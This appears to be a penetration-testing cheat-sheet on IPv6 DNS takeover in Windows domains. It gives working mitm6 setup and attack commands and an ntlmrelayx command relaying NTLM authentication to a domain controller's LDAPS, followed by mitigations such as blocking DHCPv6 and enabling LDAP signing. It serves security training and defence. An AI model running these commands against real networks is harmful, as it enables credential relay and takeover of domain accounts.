# IPv6 Attacks

## Overview

- If both IPv4 and IPv6 are enabled and v4 is the main protocol, DNS for v6 is not configured
- Attacker can impersonate IPv6 DNS server
- Capture authentication requests to DC via LDAP or SMB
- LDAP relay via NTLM

## Exploitation

### Set Up mitm6

```bash
git clone https://github.com/fox-it/mitm6 /opt/mitm6
cd /opt/mitm6
pip3 install -r requirements.txt
python3 setup.py install
```

### IPv6 DNS Takeover via mitm6

```bash
# Run mitm6
mitm6 -d domain.local

# Set up relay against DC
ntlmrelayx.py -6 -t ldaps://192.168.31.10 -wh fakepad.marvel.local -l lootme
```

## Mitigation

- Block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy
- Disable WPAD if it's not used via Group Policy
- Enable LDAP signing and LDAP channel binding
- Add Administrative users to the `Protected Users` group or marking them as sensitive and cannot be delegated to prevent impersonation of that user via delegation
